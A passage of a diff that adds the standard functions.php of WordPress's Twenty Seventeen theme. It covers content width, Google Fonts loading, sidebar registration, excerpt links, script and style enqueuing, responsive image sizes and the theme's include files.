+	$starter_content = apply_filters( 'twentyseventeen_starter_content', $starter_content );
+
+	add_theme_support( 'starter-content', $starter_content );
+}
+add_action( 'after_setup_theme', 'twentyseventeen_setup' );
+
+/**
+ * Set the content width in pixels, based on the theme's design and stylesheet.
+ *
+ * Priority 0 to make it available to lower priority callbacks.
+ *
+ * @global int $content_width
+ */
+function twentyseventeen_content_width() {
+
+	$content_width = $GLOBALS['content_width'];
+
+	// Get layout.
+	$page_layout = get_theme_mod( 'page_layout' );
+
+	// Check if layout is one column.
+	if ( 'one-column' === $page_layout ) {
+		if ( twentyseventeen_is_frontpage() ) {
+			$content_width = 644;
+		} elseif ( is_page() ) {
+			$content_width = 740;
+		}
+	}
+
+	// Check if is single post and there is no sidebar.
+	if ( is_single() && ! is_active_sidebar( 'sidebar-1' ) ) {
+		$content_width = 740;
+	}
+
+	/**
+	 * Filter Twenty Seventeen content width of the theme.
+	 *
+	 * @since Twenty Seventeen 1.0
+	 *
+	 * @param int $content_width Content width in pixels.
+	 */
+	$GLOBALS['content_width'] = apply_filters( 'twentyseventeen_content_width', $content_width );
+}
+add_action( 'template_redirect', 'twentyseventeen_content_width', 0 );
+
+/**
+ * Register custom fonts.
+ */
+function twentyseventeen_fonts_url() {
+	$fonts_url = '';
+
+	/*
+	 * Translators: If there are characters in your language that are not
+	 * supported by Libre Franklin, translate this to 'off'. Do not translate
+	 * into your own language.
+	 */
+	$libre_franklin = _x( 'on', 'Libre Franklin font: on or off', 'twentyseventeen' );
+
+	if ( 'off' !== $libre_franklin ) {
+		$font_families = array();
+
+		$font_families[] = 'Libre Franklin:300,300i,400,400i,600,600i,800,800i';
+
+		$query_args = array(
+			'family' => urlencode( implode( '|', $font_families ) ),
+			'subset' => urlencode( 'latin,latin-ext' ),
+		);
+
+		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
+	}
+
+	return esc_url_raw( $fonts_url );
+}
+
+/**
+ * Add preconnect for Google Fonts.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param array  $urls           URLs to print for resource hints.
+ * @param string $relation_type  The relation type the URLs are printed.
+ * @return array $urls           URLs to print for resource hints.
+ */
+function twentyseventeen_resource_hints( $urls, $relation_type ) {
+	if ( wp_style_is( 'twentyseventeen-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
+		$urls[] = array(
+			'href' => 'https://fonts.gstatic.com',
+			'crossorigin',
+		);
+	}
+
+	return $urls;
+}
+add_filter( 'wp_resource_hints', 'twentyseventeen_resource_hints', 10, 2 );
+
+/**
+ * Register widget area.
+ *
+ * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
+ */
+function twentyseventeen_widgets_init() {
+	register_sidebar(
+		array(
+			'name'          => __( 'Blog Sidebar', 'twentyseventeen' ),
+			'id'            => 'sidebar-1',
+			'description'   => __( 'Add widgets here to appear in your sidebar on blog posts and archive pages.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Footer 1', 'twentyseventeen' ),
+			'id'            => 'sidebar-2',
+			'description'   => __( 'Add widgets here to appear in your footer.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+
+	register_sidebar(
+		array(
+			'name'          => __( 'Footer 2', 'twentyseventeen' ),
+			'id'            => 'sidebar-3',
+			'description'   => __( 'Add widgets here to appear in your footer.', 'twentyseventeen' ),
+			'before_widget' => '<section id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</section>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
+}
+add_action( 'widgets_init', 'twentyseventeen_widgets_init' );
+
+/**
+ * Replaces "[...]" (appended to automatically generated excerpts) with ... and
+ * a 'Continue reading' link.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $link Link to single post/page.
+ * @return string 'Continue reading' link prepended with an ellipsis.
+ */
+function twentyseventeen_excerpt_more( $link ) {
+	if ( is_admin() ) {
+		return $link;
+	}
+
+	$link = sprintf(
+		'<p class="link-more"><a href="%1$s" class="more-link">%2$s</a></p>',
+		esc_url( get_permalink( get_the_ID() ) ),
+		/* translators: %s: Name of current post */
+		sprintf( __( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'twentyseventeen' ), get_the_title( get_the_ID() ) )
+	);
+	return ' &hellip; ' . $link;
+}
+add_filter( 'excerpt_more', 'twentyseventeen_excerpt_more' );
+
+/**
+ * Handles JavaScript detection.
+ *
+ * Adds a `js` class to the root `<html>` element when JavaScript is detected.
+ *
+ * @since Twenty Seventeen 1.0
+ */
+function twentyseventeen_javascript_detection() {
+	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
+}
+add_action( 'wp_head', 'twentyseventeen_javascript_detection', 0 );
+
+/**
+ * Add a pingback url auto-discovery header for singularly identifiable articles.
+ */
+function twentyseventeen_pingback_header() {
+	if ( is_singular() && pings_open() ) {
+		printf( '<link rel="pingback" href="%s">' . "\n", get_bloginfo( 'pingback_url' ) );
+	}
+}
+add_action( 'wp_head', 'twentyseventeen_pingback_header' );
+
+/**
+ * Display custom color CSS.
+ */
+function twentyseventeen_colors_css_wrap() {
+	if ( 'custom' !== get_theme_mod( 'colorscheme' ) && ! is_customize_preview() ) {
+		return;
+	}
+
+	require_once( get_parent_theme_file_path( '/inc/color-patterns.php' ) );
+	$hue = absint( get_theme_mod( 'colorscheme_hue', 250 ) );
+
+	$customize_preview_data_hue = '';
+	if ( is_customize_preview() ) {
+		$customize_preview_data_hue = 'data-hue="' . $hue . '"';
+	}
+?>
+	<style type="text/css" id="custom-theme-colors" <?php echo $customize_preview_data_hue; ?>>
+		<?php echo twentyseventeen_custom_colors_css(); ?>
+	</style>
+<?php
+}
+add_action( 'wp_head', 'twentyseventeen_colors_css_wrap' );
+
+/**
+ * Enqueue scripts and styles.
+ */
+function twentyseventeen_scripts() {
+	// Add custom fonts, used in the main stylesheet.
+	wp_enqueue_style( 'twentyseventeen-fonts', twentyseventeen_fonts_url(), array(), null );
+
+	// Theme stylesheet.
+	wp_enqueue_style( 'twentyseventeen-style', get_stylesheet_uri() );
+
+	// Load the dark colorscheme.
+	if ( 'dark' === get_theme_mod( 'colorscheme', 'light' ) || is_customize_preview() ) {
+		wp_enqueue_style( 'twentyseventeen-colors-dark', get_theme_file_uri( '/assets/css/colors-dark.css' ), array( 'twentyseventeen-style' ), '1.0' );
+	}
+
+	// Load the Internet Explorer 9 specific stylesheet, to fix display issues in the Customizer.
+	if ( is_customize_preview() ) {
+		wp_enqueue_style( 'twentyseventeen-ie9', get_theme_file_uri( '/assets/css/ie9.css' ), array( 'twentyseventeen-style' ), '1.0' );
+		wp_style_add_data( 'twentyseventeen-ie9', 'conditional', 'IE 9' );
+	}
+
+	// Load the Internet Explorer 8 specific stylesheet.
+	wp_enqueue_style( 'twentyseventeen-ie8', get_theme_file_uri( '/assets/css/ie8.css' ), array( 'twentyseventeen-style' ), '1.0' );
+	wp_style_add_data( 'twentyseventeen-ie8', 'conditional', 'lt IE 9' );
+
+	// Load the html5 shiv.
+	wp_enqueue_script( 'html5', get_theme_file_uri( '/assets/js/html5.js' ), array(), '3.7.3' );
+	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );
+
+	wp_enqueue_script( 'twentyseventeen-skip-link-focus-fix', get_theme_file_uri( '/assets/js/skip-link-focus-fix.js' ), array(), '1.0', true );
+
+	$twentyseventeen_l10n = array(
+		'quote' => twentyseventeen_get_svg( array( 'icon' => 'quote-right' ) ),
+	);
+
+	if ( has_nav_menu( 'top' ) ) {
+		wp_enqueue_script( 'twentyseventeen-navigation', get_theme_file_uri( '/assets/js/navigation.js' ), array( 'jquery' ), '1.0', true );
+		$twentyseventeen_l10n['expand']   = __( 'Expand child menu', 'twentyseventeen' );
+		$twentyseventeen_l10n['collapse'] = __( 'Collapse child menu', 'twentyseventeen' );
+		$twentyseventeen_l10n['icon']     = twentyseventeen_get_svg(
+			array(
+				'icon'     => 'angle-down',
+				'fallback' => true,
+			)
+		);
+	}
+
+	wp_enqueue_script( 'twentyseventeen-global', get_theme_file_uri( '/assets/js/global.js' ), array( 'jquery' ), '1.0', true );
+
+	wp_enqueue_script( 'jquery-scrollto', get_theme_file_uri( '/assets/js/jquery.scrollTo.js' ), array( 'jquery' ), '2.1.2', true );
+
+	wp_localize_script( 'twentyseventeen-skip-link-focus-fix', 'twentyseventeenScreenReaderText', $twentyseventeen_l10n );
+
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+}
+add_action( 'wp_enqueue_scripts', 'twentyseventeen_scripts' );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for content images.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $sizes A source size value for use in a 'sizes' attribute.
+ * @param array  $size  Image size. Accepts an array of width and height
+ *                      values in pixels (in that order).
+ * @return string A source size value for use in a content image 'sizes' attribute.
+ */
+function twentyseventeen_content_image_sizes_attr( $sizes, $size ) {
+	$width = $size[0];
+
+	if ( 740 <= $width ) {
+		$sizes = '(max-width: 706px) 89vw, (max-width: 767px) 82vw, 740px';
+	}
+
+	if ( is_active_sidebar( 'sidebar-1' ) || is_archive() || is_search() || is_home() || is_page() ) {
+		if ( ! ( is_page() && 'one-column' === get_theme_mod( 'page_options' ) ) && 767 <= $width ) {
+			$sizes = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
+		}
+	}
+
+	return $sizes;
+}
+add_filter( 'wp_calculate_image_sizes', 'twentyseventeen_content_image_sizes_attr', 10, 2 );
+
+/**
+ * Filter the `sizes` value in the header image markup.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $html   The HTML image tag markup being filtered.
+ * @param object $header The custom header object returned by 'get_custom_header()'.
+ * @param array  $attr   Array of the attributes for the image tag.
+ * @return string The filtered header image HTML.
+ */
+function twentyseventeen_header_image_tag( $html, $header, $attr ) {
+	if ( isset( $attr['sizes'] ) ) {
+		$html = str_replace( $attr['sizes'], '100vw', $html );
+	}
+	return $html;
+}
+add_filter( 'get_header_image_tag', 'twentyseventeen_header_image_tag', 10, 3 );
+
+/**
+ * Add custom image sizes attribute to enhance responsive image functionality
+ * for post thumbnails.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param array $attr       Attributes for the image markup.
+ * @param int   $attachment Image attachment ID.
+ * @param array $size       Registered image size or flat array of height and width dimensions.
+ * @return array The filtered attributes for the image markup.
+ */
+function twentyseventeen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
+	if ( is_archive() || is_search() || is_home() ) {
+		$attr['sizes'] = '(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px';
+	} else {
+		$attr['sizes'] = '100vw';
+	}
+
+	return $attr;
+}
+add_filter( 'wp_get_attachment_image_attributes', 'twentyseventeen_post_thumbnail_sizes_attr', 10, 3 );
+
+/**
+ * Use front-page.php when Front page displays is set to a static page.
+ *
+ * @since Twenty Seventeen 1.0
+ *
+ * @param string $template front-page.php.
+ *
+ * @return string The template to be used: blank if is_home() is true (defaults to index.php), else $template.
+ */
+function twentyseventeen_front_page_template( $template ) {
+	return is_home() ? '' : $template;
+}
+add_filter( 'frontpage_template', 'twentyseventeen_front_page_template' );
+
+/**
+ * Modifies tag cloud widget arguments to display all tags in the same font size
+ * and use list format for better accessibility.
+ *
+ * @since Twenty Seventeen 1.4
+ *
+ * @param array $args Arguments for tag cloud widget.
+ * @return array The filtered arguments for tag cloud widget.
+ */
+function twentyseventeen_widget_tag_cloud_args( $args ) {
+	$args['largest']  = 1;
+	$args['smallest'] = 1;
+	$args['unit']     = 'em';
+	$args['format']   = 'list';
+
+	return $args;
+}
+add_filter( 'widget_tag_cloud_args', 'twentyseventeen_widget_tag_cloud_args' );
+
+/**
+ * Implement the Custom Header feature.
+ */
+require get_parent_theme_file_path( '/inc/custom-header.php' );
+
+/**
+ * Custom template tags for this theme.
+ */
+require get_parent_theme_file_path( '/inc/template-tags.php' );
+
+/**
+ * Additional features to allow styling of the templates.
+ */
+require get_parent_theme_file_path( '/inc/template-functions.php' );
+
+/**
+ * Customizer additions.
+ */
+require get_parent_theme_file_path( '/inc/customizer.php' );
+
+/**
+ * SVG icons functions and filters.
+ */
+require get_parent_theme_file_path( '/inc/icon-functions.php' );
